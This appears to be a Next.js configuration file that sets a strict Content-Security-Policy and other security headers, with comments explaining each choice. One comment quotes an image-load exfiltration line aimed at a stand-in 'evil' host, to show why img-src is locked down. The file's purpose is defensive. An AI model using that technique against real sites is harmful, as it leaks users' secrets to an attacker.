import type { NextConfig } from "next";

// Second line of defence behind the escape-first markdown renderer: even if
// an XSS payload slipped through, it could not load external scripts or
// exfiltrate to another origin. 'unsafe-inline' script-src is required by
// Next's bootstrap scripts; styles are inline throughout the app; Google
// Fonts is the only external origin (see app/layout.tsx). The share page
// and the authorize form set their own, stricter CSP — browsers enforce
// every policy present, so the strictest one wins there.
// img-src is 'self' data: only, not https: — an open img-src lets injected
// markup exfiltrate data via new Image().src = 'https://evil/?x='+secret,
// which connect-src's 'self' does nothing to stop (image loads aren't
// fetch/XHR). The cost: note images hosted on other https domains won't load.
const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com",
  "img-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
].join('; ');

const nextConfig: NextConfig = {
  output: "standalone",
  experimental: {
    // Since proxy.ts is active for every /api/* route it protects, Next
    // clones and buffers each request body (for proxy.ts's own read) up to
    // a 10MB default — silently, with no error, just a console warning — and
    // hands the route handler that truncated buffer. /api/import declares a
    // 100MB MAX_ZIP_BYTES that was never actually reachable: anything over
    // 10MB was quietly cut to 10MB before readRequestBodyCapped ever ran,
    // producing a "Not a valid zip archive" 400 with no hint of the real
    // cause. Deliberately above MAX_ZIP_BYTES, not equal to it: if the two
    // matched exactly, THIS cap would truncate an oversized upload first,
    // so the app's own streaming check would just see an already-corrupted
    // blob under its limit and fail with the same unhelpful "not a valid
    // zip" instead of its clear 413 — the app-level check must be the one
    // that actually fires for anything a real user could plausibly send.
    proxyClientMaxBodySize: '150mb',
  },
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          { key: 'Content-Security-Policy', value: CSP },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'X-Frame-Options', value: 'DENY' },
          // Share URLs carry the capability token in the path — never leak
          // it (or anything else) through the Referer header.
          { key: 'Referrer-Policy', value: 'no-referrer' },
        ],
      },
    ];
  },
  async rewrites() {
    return [
      {
        source: '/.well-known/oauth-authorization-server',
        destination: '/api/oauth/discovery',
      },
    ];
  },
};

export default nextConfig;
